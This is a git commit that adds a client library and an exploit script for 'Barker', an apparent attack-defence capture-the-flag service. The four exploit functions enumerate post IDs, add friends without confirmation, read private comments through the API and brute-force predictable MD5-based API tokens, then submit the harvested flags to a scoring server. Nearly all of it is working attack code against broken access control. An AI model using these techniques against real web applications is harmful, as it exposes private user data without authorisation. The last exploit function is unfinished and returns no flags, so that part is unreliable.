174c91615b801ffdf93425f36c1b6b40b3a982c0
kot <ak@altinvest.dev>
2020-12-12 03:44:47 +0500

    fixes

---
+++ sploits/barker/api.py
@@ -0,0 +1,121 @@
+import requests
+import re
+
+
+class Api:
+    def __init__(self, host: str):
+        self.host = host
+        self.url = f"http://{self.host}"
+        self.api_url = f"{self.url}/api"
+        self.session = requests.Session()
+
+    def get_middleware_token(self, html: str) -> str:
+        return html.split('csrfmiddlewaretoken" value="')[1].split('"')[0]
+
+    def sing_up(self, username: str, password: str, fname: str, lname:str ) -> requests.Response:
+        r = self.session.get(f"{self.url}/signup/")
+
+        r = self.session.post(f"{self.url}/signup/", data={
+            "csrfmiddlewaretoken": self.get_middleware_token(r.text),
+            "username": username, 
+            "password": password, 
+            "fname": fname, 
+            "lname": lname
+        })
+        return r
+
+    def login(self, username: str, password: str) -> requests.Response:
+        r = self.session.get(f"{self.url}/login/")
+        
+        r = self.session.post(f"{self.url}/login/", data={
+            "csrfmiddlewaretoken": self.get_middleware_token(r.text),
+            "username": username, 
+            "password": password
+        })
+        return r
+
+    def get_user_barks(self, username: str) -> requests.Response:
+        r = self.session.get(f"{self.url}/{username}/")
+        if r.status_code == 200:
+            return r
+
+    def add_bark(self, username: str, text: str, is_private: bool = False) -> requests.Response:
+        r = self.session.get(f"{self.url}/{username}/")
+
+        data = {
+            "csrfmiddlewaretoken": self.get_middleware_token(r.text),
+            "bark_text": text
+        }
+
+        if is_private:
+            data["is_private"] = 1
+
+        r = self.session.post(f"{self.url}/add_bark/", data=data)
+        return r
+
+    def get_bark(self, bark_id: int) -> requests.Response:
+        r = self.session.get(f"{self.url}/get_bark/{bark_id}/")
+        if r.status_code == 200:
+            return r
+
+    def comment_bark(self, bark_id: int, text: str, is_private: bool = False) -> requests.Response:
+        r = self.session.get(f"{self.url}/get_bark/{bark_id}/")
+        
+        data = {
+            "csrfmiddlewaretoken": self.get_middleware_token(r.text),
+            "comment_text": text
+        }
+
+        if is_private:
+            data["is_private"] = 1
+        
+        r = self.session.post(f"{self.url}/leave_comment/{bark_id}/", data=data)
+        return r
+        
+    def add_friend(self, username: str) -> requests.Response:
+        r = self.session.get(f"{self.url}/add_friend/{username}/")
+        return r
+
+    def confirm_friend(self, username: str) -> requests.Response:
+        r = self.session.get(f"{self.url}/confirm_friend/{username}/")
+        return r
+
+    def generate_token(self) -> str:
+        r = self.session.get(f"{self.url}/generate_token/")
+        if r.status_code == 200:
+            tokens = re.findall(r"[\da-f]{32}", r.text)
+            if tokens:
+                return tokens[0]
+    
+    def api_index(self, token) -> dict:
+        r = requests.get(f"{self.api_url}/", headers={"Token": token})
+        if r.status_code == 200:
+            return r.json()
+
+    def api_barks(self, token, username) -> list:
+        r = requests.get(f"{self.api_url}/barks/{username}/", headers={"Token": token})
+        if r.status_code == 200:
+            return r.json()
+
+    def api_comments(self, token, bark_id) -> list:
+        r = requests.get(f"{self.api_url}/comments/{bark_id}/", headers={"Token": token})
+        if r.status_code == 200:
+            return r.json()
+
+    def api_user_info(self, token, username) -> dict:
+        r = requests.get(f"{self.api_url}/user/{username}", headers={"Token": token})
+        if r.status_code == 200:
+            return r.json()
+
+    def api_get_users(self, token, page_n) -> list:
+        r = requests.get(f"{self.api_url}/users/{page_n}", headers={"Token": token})
+        if r.status_code == 200:
+            return r.json()
+
+    def api_get_last_barks(self, token, page_n) -> list:
+        r = requests.get(f"{self.api_url}/last_barks/{page_n}/", headers={"Token": token})
+        if r.status_code == 200:
+            return r.json()
+
+    def logout(self):
+        self.session.get(f"{self.url}/logout/")
---
+++ sploits/barker/sploit.py
@@ -0,0 +1,122 @@
+from api import Api
+import sys
+import random, string, re, requests
+from generations import generations
+import hashlib
+
+
+FLAG_REGEXP = re.compile(r"[a-zA-Z0-9]{31}=")
+
+# Add API with two methods authorization
+# 1. Enumeration bark id (приватные barks) 
+# 2. Add to friend without confirm (приватные barks) 
+# 3. API через bark тянуть приватные комменты (приватные комменты)
+# 4. API-токен (barks и комменты)
+# 
+# N - Rate- Vulns
+# 1 - 2 - 1,2 (priv bark, pub comment) перебрать id, добавить в друзья
+# 2 - 1 - 3 (pub bark, priv comment) посмотреть комменты записи
+# 3 - 2 - 4 (private bark, private comment) подобрать token или добавить в друзья и посмотреть комменты
+
+def get_random_string(max_len:int = 20) -> str:
+    return "".join(random.choices(string.ascii_letters+string.digits, k=random.randint(5, max_len)))
+
+
+def get_flags(text: str) -> list:
+    return FLAG_REGEXP.findall(text)
+
+
+def sploit1(hostname: str) -> list:
+    api = Api(hostname)
+    username = get_random_string()
+    api.sing_up(username, get_random_string(), get_random_string(), get_random_string())
+
+    bark = get_random_string()
+    r = api.add_bark(username, bark)
+    bark_id = int(r.text.split(bark)[0].split("/get_bark/")[1][0:-3])
+
+    flags = []
+    for i in range(1, bark_id):
+        r = api.get_bark(i)
+        if r is not None:
+            flags += get_flags(r.text)
+    return flags
+
+def sploit2(hostname: str) -> list:
+    api = Api(hostname)
+    username = get_random_string()
+    api.sing_up(username, get_random_string(), get_random_string(), get_random_string())
+
+    token = api.generate_token()
+    flags = []
+    for page_n in range(0, 5):
+        users_list = api.api_get_users(token, page_n)
+        for user in users_list:
+            api.add_friend(user["username"])
+            r = api.get_user_barks(user["username"])
+            if r:
+                flags += get_flags(r.text)
+        if not users_list:
+            break
+
+    return flags
+
+
+def sploit3(hostname: str) -> list:
+    api = Api(hostname)
+    username = get_random_string()
+    api.sing_up(username, get_random_string(), get_random_string(), get_random_string())
+
+
+    token = api.generate_token()
+    flags = []
+    for page_n in range(0, 10):
+        barks_list = api.api_get_last_barks(token, page_n)
+        for bark in barks_list:
+            bark_id = bark["id"]
+            comments = api.api_comments(token, bark_id)
+            flags += [comment["text"] for comment in comments if comment["is_private"] and FLAG_REGEXP.match(comment["text"])]
+        if not barks_list:
+            break
+
+    return flags
+
+
+def sploit4(hostname: str) -> list:
+    api = Api(hostname)
+    username = get_random_string()
+    api.sing_up(username, get_random_string(), get_random_string(), get_random_string())
+
+    token = api.generate_token()
+    flags = []
+    tokens = []
+    bark_ids = []
+    for page_n in range(0, 1):
+        users_list = api.api_get_users(token, page_n)
+        for user in users_list:
+            for generation in generations:
+                token = hashlib.md5(f"{user}{generation}".encode()).hexdigest()
+                r = api.api_index(token)
+                if r:
+                    print(token)
+                    tokens.append(token)
+
+        barks_list = api.api_get_last_barks(token, page_n)
+        for bark in barks_list:
+            bark_ids.append(bark["id"])
+    print(tokens)
+    print(bark_ids)
+    return flags
+
+HOSTNAME = sys.argv[1]
+TOKEN = sys.argv[2]
+#print(f"[*] Flags from 1 sploit: {sploit1(HOSTNAME)}")
+#flags = sploit2(HOSTNAME)
+#print(f"[*] Flags from 2 sploit: {flags}")
+#flags = sploit3(HOSTNAME)
+#print(f"[*] Flags from 3 sploit: {flags}")
+flags = sploit4(HOSTNAME)
+print(f"[*] Flags from 4 sploit: {flags}")
+r = requests.put("http://10.118.0.10/flags", headers={"X-Team-Token": TOKEN}, json=flags)
+
+            
